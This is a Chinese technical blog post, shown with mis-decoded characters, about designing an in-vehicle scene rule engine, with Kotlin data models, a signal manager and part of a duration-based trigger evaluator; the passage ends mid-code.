<p>è™½ç„¶åº”ç”¨åœºæ™¯ä¸åŒï¼Œä½†å…¶åº•å±‚é€»è¾‘ä¸ Android ä¸­çš„â€œè§„åˆ™å¼•æ“â€â€œè‡ªåŠ¨åŒ–ä»»åŠ¡â€æˆ–â€œæƒ…å¢ƒæ„ŸçŸ¥åŠŸèƒ½â€ï¼ˆå¦‚ Do Not Disturbã€è‡ªé€‚åº”äº®åº¦ï¼‰éå¸¸ç›¸ä¼¼ã€‚</p>
<h3 data-id="heading-1">1. æ ¸å¿ƒéœ€æ±‚åˆ†æ</h3>
<p>ä¸€ä¸ªé«˜æ•ˆçš„åœºæ™¯å¼•æ“ï¼Œé¦–å…ˆä¾èµ–äºå¯¹<strong>å¤šæºä¸Šä¸‹æ–‡</strong>çš„å®æ—¶é‡‡é›†ä¸èåˆã€‚è¿™äº›ä¸Šä¸‹æ–‡å¯å½’çº³ä¸ºä»¥ä¸‹å››ç±»ï¼š</p>
<ul>
<li><strong>è®¾å¤‡/è½¦è¾†çŠ¶æ€</strong> å¦‚è½¦é€Ÿã€æ¡£ä½ã€ç”µé‡ã€è½¦é—¨/è½¦çª—çŠ¶æ€ã€ADASï¼ˆé«˜çº§é©¾é©¶è¾…åŠ©ç³»ç»Ÿï¼‰æ˜¯å¦å¯ç”¨ç­‰ã€‚</li>
<li><strong>ç”¨æˆ·çŠ¶æ€</strong> é€šè¿‡ FaceID æˆ–è´¦å·è¯†åˆ«é©¾é©¶å‘˜èº«ä»½ï¼Œç»“åˆ DMSï¼ˆé©¾é©¶å‘˜ç›‘æ§ç³»ç»Ÿï¼‰åˆ¤æ–­ç–²åŠ³åº¦ã€æ³¨æ„åŠ›ç­‰ã€‚</li>
<li><strong>ç¯å¢ƒä¿¡æ¯</strong> åŒ…æ‹¬ GPS ä½ç½®ã€å½“å‰æ—¶é—´ã€å¤©æ°”ã€è·¯å†µã€å®¤å†…å¤–æ¸©åº¦ç­‰ã€‚</li>
<li><strong>å¤–è®¾ä¸åº”ç”¨çŠ¶æ€</strong> æ‰‹æœºæ˜¯å¦è¿æ¥ã€è“ç‰™è€³æœºæ˜¯å¦é…å¯¹ã€åº§æ¤…ä½ç½®ã€ç©ºè°ƒè®¾ç½®ã€å½“å‰æ’­æ”¾çš„åª’ä½“ç­‰ã€‚</li>
</ul>
<p>è¿™äº›æ•°æ®å…±åŒæ„æˆäº†â€œä¸Šä¸‹æ–‡æ„ŸçŸ¥â€çš„åŸºç¡€ï¼Œä¹Ÿæ˜¯è§¦å‘æ™ºèƒ½åœºæ™¯çš„å‰æã€‚</p>
<h3 data-id="heading-2">2. åœºæ™¯å®šä¹‰ä¸ç®¡ç†</h3>
<p>ä»…ä»…èƒ½æ„ŸçŸ¥è¿˜ä¸å¤Ÿï¼Œç³»ç»Ÿè¿˜éœ€æ”¯æŒ<strong>çµæ´»çš„åœºæ™¯ç¼–æ’</strong>ä¸<strong>å¯é çš„æ‰§è¡Œæœºåˆ¶</strong>ï¼š</p>
<ol>
<li>å¯è§†åŒ–è§„åˆ™ç¼–æ’</li>
</ol>
<ul>
<li>æ”¯æŒâ€œå¦‚æœâ€¦é‚£ä¹ˆâ€¦â€ï¼ˆIf-Thenï¼‰é€»è¾‘ï¼Œå…è®¸ OEM å‚å•†æˆ–ç»ˆç«¯ç”¨æˆ·è‡ªå®šä¹‰åœºæ™¯ã€‚</li>
</ul>
<blockquote>
<ul>
<li>ç¤ºä¾‹ï¼š<code>IF è½¦é€Ÿ &gt; 60km/h AND æ—¶é—´åœ¨ 22:00â€“6:00 â†’ è‡ªåŠ¨è°ƒæš—å±å¹• + å…³é—­é€šçŸ¥éŸ³</code></li>
</ul>
</blockquote>
<ul>
<li>æ”¯æŒå¤æ‚æ¡ä»¶ç»„åˆï¼ˆAND/OR/NOTï¼‰ã€æ—¶é—´çª—å£é™åˆ¶ã€çŠ¶æ€æŒç»­åˆ¤æ–­ï¼ˆå¦‚â€œè¿ç»­5åˆ†é’Ÿæœªæ“ä½œâ€ï¼‰ã€‚</li>
</ul>
<ol start="2">
<li>åœºæ™¯ä¼˜å…ˆçº§ä¸å†²çªå¤„ç†</li>
</ol>
<ul>
<li>å½“å¤šä¸ªåœºæ™¯åŒæ—¶æ»¡è¶³æ—¶ï¼Œéœ€æŒ‰<strong>å®‰å…¨ç­‰çº§</strong>æˆ–<strong>ç”¨æˆ·åå¥½</strong>è¿›è¡Œæ’åºï¼Œé¿å…æŒ‡ä»¤å†²çªã€‚</li>
<li>ä¾‹å¦‚ï¼šâ€œé©¾é©¶æ¨¡å¼â€åº”ä¼˜å…ˆäºâ€œè§‚å½±æ¨¡å¼â€ã€‚</li>
</ul>
<ol start="3">
<li>é¢„ç½® + è‡ªå­¦ä¹ åŒæ¨¡å¼</li>
</ol>
<ul>
<li>
<p><strong>å‡ºå‚é¢„ç½®é«˜é¢‘åœºæ™¯</strong>ï¼šå¦‚â€œå›å®¶æ¨¡å¼â€â€œéœ²è¥æ¨¡å¼â€â€œå„¿ç«¥æ¨¡å¼â€ï¼Œé™ä½ç”¨æˆ·ä½¿ç”¨é—¨æ§›ã€‚</p>
</li>
<li>
<p><strong>è¡Œä¸ºå­¦ä¹ ä¸æ¨è</strong>ï¼šéšç€å¤§æ¨¡å‹ä¸Šè½¦ï¼Œé€šè¿‡ AI å¤§æ¨¡å‹åˆ†æç”¨æˆ·ä¹ æƒ¯ï¼ˆå¦‚æ¯å¤© 18:00 è¿æ¥è“ç‰™ã€å‘¨äº”å¼€å¯åº§æ¤…åŠ çƒ­ï¼‰ï¼Œè‡ªåŠ¨ç”Ÿæˆå»ºè®®åœºæ™¯ï¼Œä¹Ÿå˜å¾—éå¸¸å¸¸è§ã€‚</p>
</li>
</ul>
<h3 data-id="heading-3">3. æ ¸å¿ƒè®¾è®¡æ€æƒ³ï¼šäº‹ä»¶é©±åŠ¨ä¸è§„åˆ™åŒ¹é…</h3>
<p>åœºæ™¯å¼•æ“çš„æœ¬è´¨ï¼Œæ˜¯ä¸€ä¸ª<strong>è½»é‡çº§è§„åˆ™å¼•æ“</strong>ï¼Œå…¶æ ¸å¿ƒæµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>äº‹ä»¶é©±åŠ¨</strong>ï¼šä»»ä½•ä¸Šä¸‹æ–‡ä¿¡å·çš„å˜åŒ–ï¼ˆå¦‚è½¦é€Ÿæ›´æ–°ã€æ—¶é—´è·³è½¬ï¼‰éƒ½ä½œä¸ºäº‹ä»¶è¾“å…¥ã€‚</li>
<li><strong>è§„åˆ™åŒ¹é…</strong>ï¼šæ¯ä¸ªåœºæ™¯å¯¹åº”ä¸€ç»„æ¡ä»¶è§„åˆ™ï¼Œå½“æ‰€æœ‰æ¡ä»¶æ»¡è¶³æ—¶ï¼Œè¯¥åœºæ™¯è¢«æ¿€æ´»ã€‚</li>
<li><strong>è§£è€¦ä¸å¯é…ç½®</strong>ï¼šè§„åˆ™åº”ä»¥ JSON/YAML æˆ–æ•°æ®åº“å½¢å¼å¤–éƒ¨åŒ–ï¼Œä¾¿äº OTA æ›´æ–°æˆ– A/B æµ‹è¯•ã€‚</li>
<li><strong>é«˜æ•ˆè¯„ä¼°</strong>ï¼šé¿å…æ¯æ¬¡å…¨é‡éå†æ‰€æœ‰è§„åˆ™ï¼Œé‡‡ç”¨å¢é‡æ›´æ–°ã€ç¼“å­˜æœºåˆ¶æˆ–åå‘ç´¢å¼•ä¼˜åŒ–æ€§èƒ½ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-4">äºŒã€æŠ€æœ¯å®ç°</h2>
<p>ä¸ºæ”¯æ’‘â€œ<strong>æ„ŸçŸ¥-å†³ç­–-æ‰§è¡Œ</strong>â€é—­ç¯ï¼ŒåŸºäº Kotlin åç¨‹ä¸å“åº”å¼æ€æƒ³ï¼Œæ„å»ºäº†ä¸€å¥—è½»é‡çº§ã€çº¿ç¨‹å®‰å…¨çš„åœºæ™¯å¼•æ“å®ç°ã€‚æ•´ä½“æ¶æ„éµå¾ª <strong>ä¿¡å·é©±åŠ¨ + è§„åˆ™åŒ¹é… + åŠ¨ä½œå›è°ƒ</strong> ï¼Œæ ¸å¿ƒæ¨¡å—å¦‚ä¸‹ï¼š</p>
<h3 data-id="heading-5">1. æ ¸å¿ƒæ•°æ®æ¨¡å‹</h3>
<ul>
<li><code>Signal</code>ï¼šä»£è¡¨ä¸Šä¸‹æ–‡ä¸­çš„ä¸€ä¸ªåŸå­çŠ¶æ€å˜åŒ–ï¼ˆå¦‚ <code>speed=90</code>ï¼‰ï¼Œç”± <code>SignalManager</code> ç»Ÿä¸€ç®¡ç†ã€‚</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Signal</span>(
    <span class="hljs-keyword">val</span> key: String,
    <span class="hljs-keyword">val</span> value: Any
)
</code></pre>
<ul>
<li><code>Condition</code>ï¼šå®šä¹‰è§¦å‘æ¡ä»¶ï¼Œé‡‡ç”¨å¯†å°ç±»ï¼ˆ<code>sealed interface</code>ï¼‰æ”¯æŒå¤šç§åˆ¤æ–­é€»è¾‘ï¼ˆç­‰äºã€å¤§äºã€åœ¨é›†åˆä¸­ç­‰ï¼‰ï¼Œå¹¶å†…å»º <code>durationMs</code> å­—æ®µä»¥æ”¯æŒâ€œæŒç»­æ»¡è¶³ N ç§’æ‰è§¦å‘â€çš„è¯­ä¹‰ã€‚</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">sealed</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Condition</span> {
    <span class="hljs-keyword">val</span> signalKey: String
    <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span>

    <span class="hljs-comment">/**
* è§¦å‘æ¡ä»¶ï¼šç›¸ç­‰
* keyï¼šä¿¡å·é”®
* expectedï¼šæœŸæœ›çš„å€¼
* durationï¼šæŒç»­æ—¶é—´ï¼Œå•ä½æ¯«ç§’
*/</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Equals</span>(<span class="hljs-keyword">val</span> key: String, <span class="hljs-keyword">val</span> expected: Any, <span class="hljs-keyword">val</span> duration: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0L</span>) : Condition {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> signalKey: String = key
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span> = duration
    }

    <span class="hljs-comment">/**
* è§¦å‘æ¡ä»¶ï¼šå¤§äº
* keyï¼šä¿¡å·é”®
* thresholdï¼šé˜ˆå€¼
* durationï¼šæŒç»­æ—¶é—´ï¼Œå•ä½æ¯«ç§’
*/</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GreaterThan</span>(<span class="hljs-keyword">val</span> key: String, <span class="hljs-keyword">val</span> threshold: Number, <span class="hljs-keyword">val</span> duration: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0L</span>) :
        Condition {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> signalKey: String = key
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span> = duration
    }

    <span class="hljs-comment">/**
* è§¦å‘æ¡ä»¶ï¼šå°äº
* keyï¼šä¿¡å·é”®
* thresholdï¼šé˜ˆå€¼
* durationï¼šæŒç»­æ—¶é—´ï¼Œå•ä½æ¯«ç§’
*/</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LessThan</span>(<span class="hljs-keyword">val</span> key: String, <span class="hljs-keyword">val</span> threshold: Number, <span class="hljs-keyword">val</span> duration: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0L</span>) :
        Condition {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> signalKey: String = key
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span> = duration
    }


    <span class="hljs-comment">/**
* è§¦å‘æ¡ä»¶ï¼šåŒ…å«
* keyï¼šä¿¡å·é”®
* valueï¼šåŒ…å«çš„å€¼
* durationï¼šæŒç»­æ—¶é—´ï¼Œå•ä½æ¯«ç§’
*/</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Contains</span>(<span class="hljs-keyword">val</span> key: String, <span class="hljs-keyword">val</span> value: Any, <span class="hljs-keyword">val</span> duration: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0L</span>) : Condition {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> signalKey: String = key
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span> = duration
    }

    <span class="hljs-comment">/**
* è§¦å‘æ¡ä»¶ï¼šåœ¨èŒƒå›´å†…
* keyï¼šä¿¡å·é”®
* startï¼šå¼€å§‹å€¼
* endï¼šç»“æŸå€¼
* durationï¼šæŒç»­æ—¶é—´ï¼Œå•ä½æ¯«ç§’
*/</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Between</span>(
        <span class="hljs-keyword">val</span> key: String,
        <span class="hljs-keyword">val</span> start: Number,
        <span class="hljs-keyword">val</span> end: Number,
        <span class="hljs-keyword">val</span> duration: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0L</span>
    ) : Condition {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> signalKey: String = key
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span> = duration
    }

    <span class="hljs-comment">/***
* è§¦å‘æ¡ä»¶ï¼šåœ¨é›†åˆä¸­
* keyï¼šä¿¡å·é”®
* allowedValuesï¼šå…è®¸çš„å€¼
* durationï¼šæŒç»­æ—¶é—´ï¼Œå•ä½æ¯«ç§’
*/</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InSet</span>(<span class="hljs-keyword">val</span> key: String, <span class="hljs-keyword">val</span> allowedValues: Set&lt;Any&gt;, <span class="hljs-keyword">val</span> duration: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0L</span>) :
        Condition {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> signalKey: String = key
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span> = duration
    }

}
</code></pre>
<ul>
<li><code>Action</code>ï¼šæè¿°è¦æ‰§è¡Œçš„æ“ä½œï¼ˆå¦‚ <code>enable_eco_mode</code>ï¼‰ï¼Œæºå¸¦å‚æ•°å­—å…¸ï¼Œä¾¿äºå¤–éƒ¨ç³»ç»Ÿè§£ææ‰§è¡Œã€‚</li>
</ul>
<blockquote>
<p>æ­¤å¤„å·²ç»é«˜åº¦ç®€åŒ–ï¼Œå®é™…é¡¹ç›®ä¸­è¯·æ ¹æ®äº§å“éœ€æ±‚è¿›è¡Œæ‰©å±•ã€‚</p>
</blockquote>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Action</span>(
    val <span class="hljs-attr">name</span>: <span class="hljs-title class_">String</span>,
    val <span class="hljs-attr">params</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Any</span>&gt; = <span class="hljs-title function_">emptyMap</span>()
)
</code></pre>
<ul>
<li><code>Scene</code>ï¼šåœºæ™¯çš„æ ¸å¿ƒè½½ä½“ï¼ŒåŒ…å«è¿›å…¥/é€€å‡ºæ¡ä»¶åˆ—è¡¨ã€è¿›å…¥/é€€å‡ºåŠ¨ä½œåˆ—è¡¨ï¼Œä»¥åŠå¯è®¢é˜…çš„ <code>onEnter</code>/<code>onExit</code> å›è°ƒã€‚ä½¿ç”¨ <code>AtomicReference</code> ç®¡ç†ç›‘å¬å™¨åˆ—è¡¨ï¼Œä¿è¯çº¿ç¨‹å®‰å…¨ä¸‹çš„åŠ¨æ€æ‰©å±•èƒ½åŠ›ã€‚</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">typealias</span> SceneAction = (List&lt;Action&gt;) -&gt; <span class="hljs-built_in">Unit</span>

<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Scene</span>(
    <span class="hljs-keyword">val</span> id: String,
    <span class="hljs-keyword">val</span> name: String,
    <span class="hljs-keyword">val</span> enterConditions: List&lt;Condition&gt;,
    <span class="hljs-keyword">val</span> exitConditions: List&lt;Condition&gt;,
    <span class="hljs-keyword">val</span> enterActions: List&lt;Action&gt;,
    <span class="hljs-keyword">val</span> exitActions: List&lt;Action&gt;,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _onEnterListeners: AtomicReference&lt;List&lt;SceneAction&gt;&gt;,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _onExitListeners: AtomicReference&lt;List&lt;SceneAction&gt;&gt;
) {
    <span class="hljs-comment">// å¯¹å¤–æš´éœ²çš„ onEnter / onExit</span>
    <span class="hljs-keyword">val</span> onEnter: SceneAction = { actions -&gt;
_onEnterListeners.<span class="hljs-keyword">get</span>().forEach {
it(actions)
        }
}

<span class="hljs-keyword">val</span> onExit: SceneAction = { actions -&gt;
 synchronized(_onExitListeners) {
_onExitListeners.<span class="hljs-keyword">get</span>().forEach {
it(actions)
            }
}
}

 <span class="hljs-comment">/**
* å¿½ç•¥è§¦å‘æ¡ä»¶ï¼Œç›´æ¥æ‰§è¡Œåœºæ™¯
*/</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">enter</span><span class="hljs-params">()</span></span> {
        onEnter(enterActions)
    }

    <span class="hljs-comment">/**
* å¿½ç•¥é€€å‡ºæ¡ä»¶ï¼Œç›´æ¥é€€å‡ºåœºæ™¯
*/</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">exit</span><span class="hljs-params">()</span></span> {
        onExit(exitActions)
    }

    <span class="hljs-comment">/**
* è®¢é˜…æ–°çš„è¿›å…¥/é€€å‡ºå›è°ƒ
*/</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">subscribe</span><span class="hljs-params">(onEnter: <span class="hljs-type">SceneAction</span>, onExit: <span class="hljs-type">SceneAction</span>)</span></span> {
        _onEnterListeners.updateAndGet { list -&gt; list + onEnter }
        _onExitListeners.updateAndGet { list -&gt; list + onExit }
}

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">create</span><span class="hljs-params">(
            id: <span class="hljs-type">String</span>,
            name: <span class="hljs-type">String</span>,
            enterConditions: <span class="hljs-type">List</span>&lt;<span class="hljs-type">Condition</span>&gt; = emptyList()</span></span>,
            exitConditions: List&lt;Condition&gt; = emptyList(),
            enterActions: List&lt;Action&gt; = emptyList(),
            exitActions: List&lt;Action&gt; = emptyList(),
            onEnter: SceneAction = {} ,
            onExit: SceneAction = {}
): Scene {
            <span class="hljs-keyword">return</span> Scene(
                id = id,
                name = name,
                enterConditions = enterConditions,
                exitConditions = exitConditions,
                enterActions = enterActions,
                exitActions = exitActions,
                _onEnterListeners = AtomicReference(listOf(onEnter)),
                _onExitListeners = AtomicReference(listOf(onExit))
            )
        }
    }
}
</code></pre>
<h3 data-id="heading-6">2. ä¿¡å·ä¸­æ¢ï¼š<code>SignalManager</code></h3>
<p>ä½œä¸ºå…¨å±€å•ä¾‹ï¼Œ<code>SignalManager</code> è´Ÿè´£ï¼š</p>
<ul>
<li>ç»´æŠ¤å½“å‰æ‰€æœ‰ä¿¡å·çš„æœ€æ–°å€¼å¿«ç…§ï¼ˆ<code>currentSignals</code>ï¼‰ï¼›</li>
<li>æä¾› <code>updateSignal()</code> æ¥å£ä¾›<code>CarService</code>æˆ–ç³»ç»ŸæœåŠ¡æ¨é€çŠ¶æ€å˜æ›´ï¼›</li>
<li>æ”¯æŒå¤šè§‚å¯Ÿè€…è®¢é˜…ï¼ˆ<code>subscribe</code>ï¼‰ï¼Œå½“ä»»ä¸€ä¿¡å·æ›´æ–°æ—¶ï¼Œå¹¿æ’­ç»™æ‰€æœ‰ç›‘å¬è€…ã€‚</li>
</ul>
<p>è®¾è®¡ä¸Šæ•°æ®æºä¸æ¶ˆè´¹é€»è¾‘çš„è§£è€¦ï¼Œä»»ä½•æ¨¡å—åªéœ€ç›‘å¬ä¿¡å·å˜åŒ–å³å¯å‚ä¸åœºæ™¯è¯„ä¼°ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"> <span class="hljs-comment">/**
* ä¿¡å·ç®¡ç†å™¨ï¼Œç”¨äºç®¡ç†æ‰€æœ‰ä¿¡å·çš„å˜åŒ–å’Œè®¢é˜…
* è½¦è½½åº”ç”¨ä¸­ï¼Œä¼šå¯¹æ¥CarServiceå’Œå…¶ä»–ä¼ æ„Ÿå™¨ï¼Œå¹¶åœ¨åº”ç”¨å¯åŠ¨åç«‹å³å°†æ‰€æœ‰ä¿¡å·æ›´æ–°åˆ°ä¿¡å·ç®¡ç†å™¨ä¸­
*/</span>
<span class="hljs-keyword">object</span> SignalManager {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> currentSignals = mutableMapOf&lt;String, Any&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> listeners = mutableListOf&lt;SignalListener&gt;()

    <span class="hljs-comment">/**
* æ›´æ–°ä¿¡å·å€¼ï¼Œå¹¶é€šçŸ¥æ‰€æœ‰è®¢é˜…è€…
*/</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">updateSignal</span><span class="hljs-params">(signal: <span class="hljs-type">Signal</span>)</span></span> {
        println(<span class="hljs-string">"[updateSignal]: <span class="hljs-variable">$signal</span>"</span>)
        currentSignals[signal.key] = signal.value
        listeners.forEach { it(signal) }
}

    <span class="hljs-comment">/**
* è·å–å½“å‰ä¿¡å·å€¼
* <span class="hljs-doctag">@param</span> key ä¿¡å·é”®å€¼
* <span class="hljs-doctag">@return</span> å½“å‰ä¿¡å·å€¼ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™è¿”å›null
*/</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getCurrentValue</span><span class="hljs-params">(key: <span class="hljs-type">String</span>)</span></span>: Any? = currentSignals[key]

    <span class="hljs-comment">/**
* è®¢é˜…ä¿¡å·å˜åŒ–ï¼Œå¹¶æ³¨å†Œç›‘å¬å™¨
*/</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">subscribe</span><span class="hljs-params">(listener: (<span class="hljs-type">Signal</span>) -&gt; <span class="hljs-type">Unit</span>)</span></span> {
        listeners.add(listener)
    }

    <span class="hljs-comment">/**
* å–æ¶ˆè®¢é˜…ï¼Œç§»é™¤ç›‘å¬å™¨
*/</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">unsubscribe</span><span class="hljs-params">(listener: (<span class="hljs-type">Signal</span>) -&gt; <span class="hljs-type">Unit</span>)</span></span> {
        listeners.remove(listener)
    }
}
</code></pre>
<h3 data-id="heading-7">3. è§„åˆ™å¼•æ“ï¼š<code>RuleEngine</code></h3>
<p><code>RuleEngine</code> æ˜¯æ•´ä¸ªç³»ç»Ÿçš„è°ƒåº¦æ ¸å¿ƒï¼Œå…¶å…³é”®è®¾è®¡åŒ…æ‹¬ï¼š</p>
<ul>
<li>åå‘ç´¢å¼•ä¼˜åŒ–ï¼šæ„å»º <code>signalKey â†’ [sceneId]</code> çš„æ˜ å°„ï¼ˆåˆ†ä¸ºè¿›å…¥/é€€å‡ºä¸¤å¥—ï¼‰ï¼Œä½¿å¾—æ¯æ¬¡ä¿¡å·æ›´æ–°ä»…éœ€è¯„ä¼°å¯èƒ½å—å½±å“çš„åœºæ™¯ï¼Œé¿å…å…¨é‡æ‰«æï¼Œæ˜¾è‘—æå‡æ€§èƒ½ã€‚</li>
<li>çŠ¶æ€æŒä¹…åŒ–ï¼šä½¿ç”¨ <code>enterStates</code> / <code>exitStates</code> è®°å½•æ¯ä¸ªæ¡ä»¶çš„é¦–æ¬¡æ»¡è¶³æ—¶é—´æˆ³ï¼Œç”¨äºè®¡ç®—æ˜¯å¦è¾¾åˆ° <code>duration</code> è¦æ±‚ã€‚</li>
<li>åç¨‹è°ƒåº¦ï¼šåˆ©ç”¨ <code>kotlinx.coroutines</code> å®ç°å»¶è¿Ÿé‡è¯„ã€‚å½“æ¡ä»¶æ»¡è¶³ä½†æœªè¾¾æŒç»­æ—¶é—´æ—¶ï¼Œè‡ªåŠ¨è°ƒåº¦ä¸€ä¸ªå»¶è¿Ÿä»»åŠ¡ï¼Œåœ¨ç²¾ç¡®æ—¶åˆ»é‡æ–°è¯„ä¼°ï¼Œé¿å…è½®è¯¢å¼€é”€ã€‚</li>
<li>åºåˆ—è¿½è¸ªï¼šé€šè¿‡ <code>sequenceProgress</code> å’Œ <code>lastStepTimestamp</code> ä¸¤ä¸ªå¹¶å‘å®‰å…¨çš„ Mapï¼Œè®°å½•æ¯ä¸ªåœºæ™¯åœ¨åºåˆ—åŒ¹é…ä¸­çš„å½“å‰è¿›åº¦ä¸ä¸Šä¸€æ­¥å®Œæˆæ—¶é—´ï¼Œç¡®ä¿æ—¶åºé€»è¾‘æ­£ç¡®ã€‚</li>
</ul>
<p>ä»£ç å¤ªé•¿ï¼Œå®Œæ•´ä»£ç è¯·å‚è€ƒï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flinxu-link%2FVehicleSceneEngine%2Fblob%2Fmaster%2Fapp%2Fsrc%2Fmain%2Fjava%2Fcom%2Fwj%2Fsceneengine%2Fengine%2FRuleEngine.kt" target="_blank" title="https://github.com/linxu-link/VehicleSceneEngine/blob/master/app/src/main/java/com/wj/sceneengine/engine/RuleEngine.kt" ref="nofollow noopener noreferrer">github.com/linxu-link/â€¦</a></p>
<hr/>
<h2 data-id="heading-8">ä¸‰ã€è¿›é˜¶éœ€æ±‚åˆ†æ</h2>
<p>åœ¨åŸºç¡€è§„åˆ™åŒ¹é…ä¹‹ä¸Šï¼ŒçœŸå®è½¦è½½åœºæ™¯å¸¸æ¶‰åŠæ›´å¤æ‚çš„æ—¶ç©ºé€»è¾‘ã€‚å¼•æ“é€šè¿‡ä¸¤ç§æœºåˆ¶åº”å¯¹å…¸å‹è¿›é˜¶éœ€æ±‚ï¼š</p>
<h3 data-id="heading-9">1. æŒç»­æ»¡è¶³ N ç§’æ‰è§¦å‘</h3>
<p>éœ€æ±‚èƒŒæ™¯ï¼šç¬æ—¶ä¿¡å·æ³¢åŠ¨ï¼ˆå¦‚é›·è¾¾è¯¯æŠ¥ã€GPSè·³å˜ï¼‰ä¸åº”å¯¼è‡´åœºæ™¯é¢‘ç¹åˆ‡æ¢ã€‚ å®ç°æ–¹æ¡ˆï¼š</p>
<ul>
<li>åœ¨ <code>Condition</code> ä¸­å¢åŠ  <code>durationMs</code> å­—æ®µã€‚</li>
<li><code>RuleEngine</code> åœ¨é¦–æ¬¡æ»¡è¶³æ¡ä»¶æ—¶è®°å½•æ—¶é—´æˆ³ï¼Œåç»­æ¯æ¬¡è¯„ä¼°æ£€æŸ¥ <code>(now - startTime) &gt;= durationMs</code>ã€‚</li>
<li>è‹¥æ¡ä»¶ä¸­é€”ä¸æ»¡è¶³ï¼Œåˆ™ç«‹å³æ¸…é™¤è®¡æ—¶çŠ¶æ€ã€‚</li>
<li>åˆ©ç”¨åç¨‹ <code>delay()</code> ç²¾ç¡®è°ƒåº¦é‡è¯„ä»»åŠ¡ï¼Œè€Œéä½æ•ˆè½®è¯¢ã€‚</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æ¡ä»¶çŠ¶æ€è®°å½•</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> enterStates = ConcurrentHashMap&lt;String, MutableMap&lt;Condition, <span class="hljs-built_in">Long</span>&gt;&gt;()
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> exitStates = ConcurrentHashMap&lt;String, MutableMap&lt;Condition, <span class="hljs-built_in">Long</span>&gt;&gt;()
<span class="hljs-comment">// åç¨‹ä¸ä»»åŠ¡ç®¡ç†</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> enterJobs = ConcurrentHashMap&lt;String, Job&gt;()
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> exitJobs = ConcurrentHashMap&lt;String, Job&gt;()
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> mutex = Mutex()
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> scope = CoroutineScope(Dispatchers.Default + SupervisorJob())

<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processEnterLogic</span><span class="hljs-params">(scene: <span class="hljs-type">Scene</span>, now: <span class="hljs-type">Long</span>, triggerSignal: <span class="hljs-type">Signal</span>?)</span></span> {
    <span class="hljs-keyword">val</span> enterState = enterStates.getOrPut(scene.id) { ConcurrentHashMap() }

<span class="hljs-comment">// 1. å¤„ç†åºåˆ—æ¡ä»¶ (å¦‚æœæœ‰)</span>
    <span class="hljs-keyword">val</span> seqCond = scene.enterConditions.filterIsInstance&lt;SequenceCondition&gt;().firstOrNull()
